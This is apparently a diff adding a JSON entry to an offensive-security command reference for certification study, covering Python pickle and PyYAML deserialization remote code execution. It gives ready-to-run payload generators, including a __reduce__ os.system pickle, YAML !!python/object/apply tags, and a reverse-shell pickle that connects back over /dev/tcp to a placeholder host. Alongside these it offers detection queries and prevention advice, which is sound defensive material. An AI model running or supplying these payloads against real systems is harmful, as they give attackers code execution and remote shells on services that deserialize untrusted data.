@@ -1,0 +1,107 @@
+{
+  "id": "deser-python-pickle",
+  "name": "Python pickle / PyYAML Deserialization RCE",
+  "command": "python3 -c \"import pickle,os;print(pickle.dumps(type('R',(object,),{'__reduce__':lambda s:(os.system,('<command>',))})()))\"",
+  "description": "Python's pickle module executes a __reduce__ callable during unpickling, so a crafted object returning (os.system, (cmd,)) yields code execution the moment pickle.loads() touches attacker data. The same class of bug hits PyYAML's yaml.load() without a safe loader (python/object/apply tags) and other object-reconstructing deserializers. Sinks appear in session blobs, caches, message queues, and ML model files.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Web Exploitation",
+  "subcategory": "Deserialization",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "Python docs; PyYAML",
+  "tags": [
+    "deserialization",
+    "pickle",
+    "python",
+    "pyyaml",
+    "__reduce__",
+    "rce"
+  ],
+  "mitre": [
+    "T1190",
+    "T1059"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== IDENTIFY A PICKLE SINK ===\n  # pickle.loads/pickle.load, cPickle, pandas.read_pickle, joblib.load, torch.load,\n  # celery/redis caches, Django sessions with the pickle serializer.\n  # Raw pickle starts with \\x80\\x04\\x95 (protocol 4); base64 often starts with gASV.\n\n=== CRAFT A MALICIOUS PICKLE ===\n  import pickle, os, base64\n  class RCE:\n      def __reduce__(self):\n          return (os.system, (\"id\",))\n  payload = pickle.dumps(RCE())\n  print(base64.b64encode(payload).decode())   # ship this where loads() will read it\n  # Reverse shell variant:\n  #   return (os.system, (\"bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'\",))\n\n=== TRIGGER ===\n  # Server-side anything that does:\n  pickle.loads(base64.b64decode(attacker_blob))   # fires __reduce__ -> os.system\n\n=== PYYAML (yaml.load without SafeLoader) ===\n  # Vulnerable: yaml.load(data)  or yaml.load(data, Loader=yaml.Loader/FullLoader-pre-5.1)\n  payload: \"!!python/object/apply:os.system ['id']\"\n  payload: \"!!python/object/apply:subprocess.check_output [['id']]\"\n  # Safe: yaml.safe_load(data)\n\n=== OTHER PYTHON SINKS ===\n  jsonpickle.decode, PyYAML, dill, shelve, marshal (less controllable),\n  torch.load / numpy.load(allow_pickle=True) for ML supply-chain.\n\n=== ALTERNATIVES ===\n  Ruby Marshal.load universal gadget - see deser-ruby-universal\n  Node.js node-serialize - see deser-nodejs",
+  "examples": [
+    {
+      "label": "Build a __reduce__ os.system pickle",
+      "command": "python3 -c \"import pickle,os,base64;print(base64.b64encode(pickle.dumps(type('R',(object,),{'__reduce__':lambda s:(os.system,('id',))})())).decode())\""
+    },
+    {
+      "label": "PyYAML unsafe load RCE tag",
+      "command": "echo '!!python/object/apply:os.system [\"id\"]' | python3 -c \"import yaml,sys;yaml.load(sys.stdin,Loader=yaml.Loader)\""
+    },
+    {
+      "label": "Reverse shell pickle command",
+      "command": "python3 -c \"import pickle,os;pickle.dumps(type('R',(object,),{'__reduce__':lambda s:(os.system,('bash -c \\\"bash -i >& /dev/tcp/<ip>/<port> 0>&1\\\"',))})())\""
+    }
+  ],
+  "references": [
+    {
+      "title": "Python docs - pickle (security)",
+      "url": "https://docs.python.org/3/library/pickle.html"
+    },
+    {
+      "title": "PyYAML - yaml.load warning",
+      "url": "https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation"
+    },
+    {
+      "title": "OWASP Deserialization Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "exploit-deserialization",
+      "note": "Generic multi-language deserialization hub card.",
+      "rel": "prereq"
+    },
+    {
+      "id": "deser-ruby-universal",
+      "note": "Ruby Marshal.load RCE, a sibling runtime.",
+      "rel": "alternative"
+    },
+    {
+      "id": "deser-php-phpggc",
+      "note": "PHP object-injection chains, a sibling runtime.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "pickle is by design a virtual machine that calls the reconstructor returned by __reduce__, so unpickling attacker data runs attacker-chosen callables such as os.system. PyYAML's non-safe loaders resolve python/object tags the same way. There is no sandbox around this.",
+    "prerequisites": "Code that unpickles (or yaml.load without SafeLoader) data an attacker can influence - request body, cookie, cache entry, uploaded model, or queue message.",
+    "impact": "Remote code execution as the Python process user.",
+    "detection": "[MITRE T1190] Inbound blobs beginning with \\x80 pickle opcodes or gASV base64, or YAML containing !!python/object; [MITRE T1059] the python interpreter spawning sh/bash/cmd children.",
+    "artifacts": "Proxy/web logs with pickle/base64 blobs or !!python/object tags; EDR process tree python -> sh/bash; Linux auditd execve of a shell parented by python.",
+    "splunk_spl": "index=web (request_body=\"*gASV*\" OR request_body=\"*!!python/object*\" OR request_body=\"*\\\\x80\\\\x04*\")\n| table _time, src_ip, uri_path, request_body",
+    "elastic_kql": "http.request.body.content:(*gASV* or *!!python/object*)",
+    "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName startswith \"python\"\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"cmd.exe\",\"powershell.exe\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+    "sigma_rules": "python_deserialization_pickle_shell_child",
+    "prevention": "Never unpickle untrusted data; use JSON or a signed/HMAC'd format. Use yaml.safe_load exclusively. For ML artifacts prefer safetensors over pickle-backed formats; set numpy/torch allow_pickle=False where possible; run workers least-privileged and network-segmented.",
+    "sources": [
+      "https://docs.python.org/3/library/pickle.html",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Python interpreter spawning a shell (pickle RCE)",
+        "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName startswith \"python\"\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"cmd.exe\",\"powershell.exe\",\"curl\",\"wget\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+        "data_source": "edr",
+        "attack": [
+          "T1059"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Scripts and notebooks that legitimately invoke subprocess shells",
+        "tuning": "Scope to web/worker service accounts; allowlist known automation"
+      }
+    ]
+  }
+}
